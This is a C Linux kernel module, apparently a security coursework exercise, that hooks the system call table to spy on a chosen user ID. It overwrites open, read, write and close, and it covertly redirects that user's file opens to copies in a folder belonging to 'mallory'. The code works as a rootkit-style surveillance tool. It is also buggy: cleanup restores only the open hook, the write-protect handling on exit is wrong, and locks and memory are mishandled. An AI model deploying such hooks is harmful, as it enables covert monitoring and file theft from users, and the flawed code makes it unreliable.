#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>	
#include <linux/unistd.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/syscalls.h>
#include <linux/namei.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/buffer_head.h>
#include <linux/fcntl.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fsnotify.h>
#include <linux/fdtable.h>
#include <asm/uaccess.h>
#include <asm/cacheflush.h>
#include <asm/segment.h>

///< The license type -- this affects runtime behavior
MODULE_LICENSE("GPL");
///< The author -- visible when you use modinfo
MODULE_AUTHOR("Shuyang Liu");
///< The description -- see modinfo
MODULE_DESCRIPTION("Replacing open system call");
///< The version of the module
MODULE_VERSION("0.1");

/* 
 * The system call table (a table of functions). We
 * just define this as external, and the kernel will
 * fill it up for us when we are insmod'ed
 *
 * sys_call_table is no longer exported in 2.6.x kernels.
 * If you really want to try this DANGEROUS module you will
 * have to apply the supplied patch against your current kernel
 * and recompile it.
 */
unsigned long *sys_call_table;

/* 
 * UID we want to spy on - will be filled from the
 * command line 
 */
static int uid;
module_param(uid, int, 0644);

/*
 * Obtained from /boot/System.map
 */
void (*pages_rw)(struct page *page, int numpages) = (void *) 0xffffffff810345a0;
void (*pages_ro)(struct page *page, int numpages) = (void *) 0xffffffff81034560;

/* 
 * A pointer to the original system call. The reason
 * we keep this, rather than call the original function
 * (sys_open), is because somebody else might have
 * replaced the system call before us. Note that this
 * is not 100% safe, because if another module
 * replaced sys_open before us, then when we're inserted
 * we'll call the function in that module - and it
 * might be removed before we are.
 *
 * Another reason for this is that we can't get sys_open.
 * It's a static variable, so it is not exported. 
 */
asmlinkage int (*original_open) (const char *, int, int);
asmlinkage int (*original_read) (int, void*, size_t);
asmlinkage int (*original_write) (int, const void *, size_t);
asmlinkage int (*original_close) (int);

/*
 * Routines for creating, reading, and writing files in Kernel space
 */
struct file *
file_open(const char *path, 
	int flags, int rights) 
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;
    oldfs = get_fs();
    set_fs(get_ds());

    filp = filp_open(path, flags, rights);
    
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

void 
file_close(struct file *file) 
{
    filp_close(file, NULL);
}

int 
file_read(struct file *file, 
	unsigned long long offset, 
	unsigned char *data, 
	unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}   

int 
file_write(struct file *file, 
	unsigned long long offset, 
	unsigned char *data, 
	unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int 
file_sync(struct file *file) 
{
    vfs_fsync(file, 0);
    return 0;
}


/* 
 * The function we'll replace sys_open (the function
 * called when you call the open system call) with. To
 * find the exact prototype, with the number and type
 * of arguments, we find the original function first
 * (it's at fs/open.c).
 *
 * In theory, this means that we're tied to the
 * current version of the kernel. In practice, the
 * system calls almost never change (it would wreck havoc
 * and require programs to be recompiled, since the system
 * calls are the interface between the kernel and the
 * processes).
 */
asmlinkage int our_sys_open(const char *filename, int flags, int mode)
{
	/* 
	 * Check if this is the user I am spying on 
	 */
	if(get_current_user()->uid == uid){

		char *hidden_path;
		char * name;
		int fd;
		
		hidden_path =(char*) kmalloc(strlen(filename)+14+6, GFP_KERNEL);
		// Print out some information
		printk(KERN_INFO "Opened file by uid: %d\n", get_current_user()->uid);
		printk(KERN_INFO "File name: %s\n", filename);
		printk(KERN_INFO "The flags is: %d\n", flags);
		printk(KERN_INFO "The file permission is: %o\n", mode);
		
		// whenever user sliu44 is accessing a file, it would also create 
		// the same file under mallory's copy folder
		// mallory can access all the files in his copy folder
		
		// filp_open cannot create directories along with the file name, 
		// For now, I'm replacing '/' with '-' and all files are in the same folder
		// /home/mallory/copy/
		name = (char*) kmalloc(strlen(filename), GFP_KERNEL);
		if(copy_from_user(name, filename, strlen(filename))==0){
			int i;
			for(i=0; i<strlen(name); i++){
				if(name[i] == '/'){
					name[i] = '-';
				}
			}
		}
		strcpy(hidden_path, "/home/mallory/copy/");
		strcat(hidden_path, name);
		printk(KERN_INFO "hidden_path: %s\n\n", hidden_path);

		/*
			"The kernel expects the pointer passed to the sys_open() function call 
			to be coming from user space. So, it makes a check of the pointer to 
			verify it is in the proper address space in order to try to convert 
			it to a kernel pointer that the rest of the kernel can use. 
			So, when we are trying to pass a kernel pointer to the function, 
			the error -EFAULT occurs."
				- Source: https://www.linuxjournal.com/article/8110
			
			Therefore, need to use filp_open
		 */
		
		// IMPORTANT: Need to modify the kernel source code 
		// need to add EXPORT_SYMBOL to alloc_fd functions and 
		// some helper functions in order to use it
		fd = get_unused_fd_flags(flags); 
		if (fd >= 0) {
		
			struct file * cpy_file = filp_open(hidden_path, 
					O_DIRECTORY|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
		
			if(cpy_file != NULL && (!IS_ERR(cpy_file))){
				
				fsnotify_open(cpy_file->f_path.dentry);
				fd_install(fd, cpy_file);
				printk(KERN_INFO "installed new file descriptor : %d. \n", fd);
				
				// Return the wrong file descriptor that I just made
				return fd;

			} else {
				put_unused_fd(fd);
				fd = PTR_ERR(cpy_file);
			}
		}
		// Free the path buffer
		kfree(hidden_path);
		kfree(name);
	}

	return original_open(filename, flags, mode);

}

asmlinkage int our_sys_close(int fd) 
{
	// find the file object associate with fd
	struct files_struct *files = current->files;
	struct fdtable *fdt;
	struct file * filp;
	struct path *path;
	char *pathname;
	char *tmp;
	int i;
	int actual_fd = fd;
	
	spin_lock(&files->file_lock);
	fdt = files_fdtable(files);
	filp = fdt->fd[fd];
	path = &filp->f_path;
    path_get(path);
    tmp = (char *)__get_free_page(GFP_KERNEL);
    if (!tmp) {
    	path_put(path);
    	return -ENOMEM;
	}
	
	pathname = d_path(path, tmp, PAGE_SIZE);
	path_put(path);
	
	//change back the path name
	for(i=0; i<strlen(pathname); i++){
		if(pathname[i] == '-'){
			pathname[i] = '/';
		}
	}
	
	// find the original file
	for(i=0; i<fdt->max_fds; ++i){
		struct file *f = fdt->fd[i];
		if(strcmp(d_path(&f->f_path, tmp, PAGE_SIZE), pathname)==0){
			actual_fd = i;
			break;
		}
	}
	// close both files
	spin_unlock(&files->file_lock);							
	original_close(fd);
	return original_close(actual_fd);
}

asmlinkage int our_sys_read(int fd, void* buf, size_t count) 
{

	// find original file
	// read from original file
		// find the file object associate with fd
	struct files_struct *files = current->files;
	struct fdtable *fdt;
	struct file * filp;
	struct path *path;
	char *pathname;
	char *tmp;
	int i;
	int actual_fd = fd;
	
	spin_lock(&files->file_lock);
	fdt = files_fdtable(files);
	filp = fdt->fd[fd];
	path = &filp->f_path;
    path_get(path);
    tmp = (char *)__get_free_page(GFP_KERNEL);
    if (!tmp) {
    	path_put(path);
    	return -ENOMEM;
	}
	
	pathname = d_path(path, tmp, PAGE_SIZE);
	path_put(path);
	
	//change back the path name
	for(i=0; i<strlen(pathname); i++){
		if(pathname[i] == '-'){
			pathname[i] = '/';
		}
	}
	
	// find the original file
	for(i=0; i<fdt->max_fds; ++i){
		struct file *f = fdt->fd[i];
		if(strcmp(d_path(&f->f_path, tmp, PAGE_SIZE), pathname)==0){
			actual_fd = i;
			break;
		}
	}
	// read from actual files
	spin_unlock(&files->file_lock);							
	
	return original_read(actual_fd, buf, count);


}

asmlinkage int our_sys_write(int fd, const void* buf, size_t count) 
{

	// find original file
	// perform the same write to the original file
		// find the file object associate with fd
	struct files_struct *files = current->files;
	struct fdtable *fdt;
	struct file * filp;
	struct path *path;
	char *pathname;
	char *tmp;
	int i;
	int actual_fd = fd;
	
	spin_lock(&files->file_lock);
	fdt = files_fdtable(files);
	filp = fdt->fd[fd];
	path = &filp->f_path;
    path_get(path);
    tmp = (char *)__get_free_page(GFP_KERNEL);
    if (!tmp) {
    	path_put(path);
    	return -ENOMEM;
	}
	
	pathname = d_path(path, tmp, PAGE_SIZE);
	path_put(path);
	
	//change back the path name
	for(i=0; i<strlen(pathname); i++){
		if(pathname[i] == '-'){
			pathname[i] = '/';
		}
	}
	
	// find the original file
	for(i=0; i<fdt->max_fds; ++i){
		struct file *f = fdt->fd[i];
		if(strcmp(d_path(&f->f_path, tmp, PAGE_SIZE), pathname)==0){
			actual_fd = i;
			break;
		}
	}
	// write to both files
	spin_unlock(&files->file_lock);							
	original_write(actual_fd, buf, count);
	return original_write(fd, buf, count);

}

/* 
 * Initialize the module - replace the system call 
 */
int init_module()
{
	struct page *sys_call_table_temp;

	printk(KERN_ALERT "System Hook loaded \n");

	// make the syscall page writable
	// Change the protected bit of Control Register
	write_cr0 (read_cr0 () & (~ 0x10000)); 
	// address of the syscall table from /boot/System.map file
	sys_call_table = (long unsigned int*) 0xffffffff816003e0; 
	sys_call_table_temp = virt_to_page(&sys_call_table[__NR_open]);
	pages_rw(sys_call_table_temp, 1);

	/* 
	 * Keep a pointer to the original function in
	 * original_call, and then replace the system call
	 * in the system call table with our_sys_open 
	 */
	original_open 	= sys_call_table[__NR_open];
	original_close 	= sys_call_table[__NR_close];
	original_read 	= sys_call_table[__NR_read];
	original_write 	= sys_call_table[__NR_write];

	// replace them with our version
	sys_call_table[__NR_open] = our_sys_open;
	sys_call_table[__NR_close] = our_sys_close;
	sys_call_table[__NR_read] = our_sys_read;
	sys_call_table[__NR_write] = our_sys_write;

	/* 
	 * To get the address of the function for system
	 * call foo, go to sys_call_table[__NR_foo]. 
	 */

	printk(KERN_INFO "Spying on UID:%d\n", uid);

	return 0;
}

/* 
 * Cleanup - unregister the appropriate file from /proc 
 */
void cleanup_module()
{
	struct page *sys_call_table_temp;
	/* 
	 * Return the system call back to normal 
	 */
	if (sys_call_table[__NR_open] != our_sys_open) {
		printk(KERN_ALERT "Somebody else also played with the ");
		printk(KERN_ALERT "open system call\n");
		printk(KERN_ALERT "The system may be left in ");
		printk(KERN_ALERT "an unstable state.\n");
	}
	
	// Change back the protected bit of control register
	write_cr0 (read_cr0 () & (~ 0x10000)); 
	sys_call_table_temp = virt_to_page(&sys_call_table[__NR_open]);
	sys_call_table[__NR_open] = original_open;
	pages_ro(sys_call_table_temp, 1);
	
	printk(KERN_INFO "System Hook exit\n");
}

